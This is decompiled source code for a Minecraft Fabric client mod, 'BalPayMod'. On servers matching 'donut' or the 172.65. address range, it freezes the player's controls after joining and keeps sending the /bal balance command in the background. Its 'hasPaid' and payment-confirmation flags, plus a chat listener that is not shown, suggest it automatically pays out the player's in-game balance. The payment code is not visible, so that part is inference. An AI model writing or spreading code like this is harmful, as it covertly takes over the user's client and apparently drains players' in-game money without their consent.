package com.example;

import com.example.ChatListener;
import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;
import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;
import net.minecraft.class_243;
import net.minecraft.class_2596;
import net.minecraft.class_310;
import net.minecraft.class_638;
import net.minecraft.class_7472;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

@Environment(value=EnvType.CLIENT)
public class BalPayMod
implements ClientModInitializer {
    public static final Logger LOGGER = LoggerFactory.getLogger("BalPayMod");
    private static class_638 lastLevel = null;
    public static volatile boolean hasPaid = false;
    public static volatile boolean awaitingPaymentConfirmation = false;
    private static int balTimer = 0;
    private static int confirmationTimer = 0;
    private static int freezeTicks = 0;

    public void onInitializeClient() {
        LOGGER.info("BalPayMod initialized!");
        ChatListener.register();
        ClientPlayConnectionEvents.JOIN.register((handler, sender, client) -> {
            BalPayMod.reset();
            LOGGER.info("BalPayMod: Connection JOIN event triggered, pre-arming /bal and freeze...");
        });
        ClientTickEvents.START_CLIENT_TICK.register(client -> {
            if (freezeTicks > 0 && client.field_1724 != null && client.field_1690 != null) {
                client.field_1690.field_1894.method_23481(false);
                client.field_1690.field_1881.method_23481(false);
                client.field_1690.field_1913.method_23481(false);
                client.field_1690.field_1849.method_23481(false);
                client.field_1690.field_1903.method_23481(false);
                client.field_1690.field_1832.method_23481(false);
                client.field_1690.field_1867.method_23481(false);
                class_243 currentVel = client.field_1724.method_18798();
                client.field_1724.method_18800(0.0, currentVel.field_1351, 0.0);
            }
        });
        ClientTickEvents.END_CLIENT_TICK.register(client -> {
            if (client.field_1724 == null || client.method_1562() == null) {
                BalPayMod.reset();
                lastLevel = null;
                return;
            }
            if (client.field_1687 != lastLevel) {
                lastLevel = client.field_1687;
                BalPayMod.reset();
                LOGGER.info("BalPayMod: World change detected, freezing for 2s and sending /bal immediately...");
                if (BalPayMod.isDonutServer(client)) {
                    BalPayMod.sendPlayerCommand("bal");
                }
                return;
            }
            if (freezeTicks > 0 && --freezeTicks == 0) {
                LOGGER.info("BalPayMod: 2s freeze ended, controls restored.");
            }
            if (hasPaid) {
                return;
            }
            if (awaitingPaymentConfirmation) {
                if (++confirmationTimer >= 80) {
                    awaitingPaymentConfirmation = false;
                    confirmationTimer = 0;
                    balTimer = 0;
                }
                return;
            }
            if (BalPayMod.isDonutServer(client) && ++balTimer >= 30) {
                balTimer = 0;
                BalPayMod.sendPlayerCommand("bal");
            }
        });
    }

    public static void sendPlayerCommand(String command) {
        class_310 client = class_310.method_1551();
        if (client.field_1724 == null || client.method_1562() == null) {
            return;
        }
        String cleanCmd = command.startsWith("/") ? command.substring(1) : command;
        LOGGER.info("BalPayMod: Sending packet for command /{}", (Object)cleanCmd);
        try {
            client.method_1562().method_48296().method_10743((class_2596)new class_7472(cleanCmd));
        }
        catch (Throwable t) {
            try {
                client.method_1562().method_45730(cleanCmd);
            }
            catch (Throwable t2) {
                LOGGER.error("BalPayMod: Failed to send command", t2);
            }
        }
    }

    public static void reset() {
        hasPaid = false;
        awaitingPaymentConfirmation = false;
        balTimer = 0;
        confirmationTimer = 0;
        freezeTicks = 40;
    }

    private static boolean isDonutServer(class_310 client) {
        String addr;
        if (client.method_1558() != null && client.method_1558().field_3761 != null && client.method_1558().field_3761.toLowerCase().contains("donut")) {
            return true;
        }
        return client.method_1562() != null && client.method_1562().method_48296() != null && client.method_1562().method_48296().method_10755() != null && ((addr = client.method_1562().method_48296().method_10755().toString().toLowerCase()).contains("donut") || addr.contains("172.65."));
    }
}
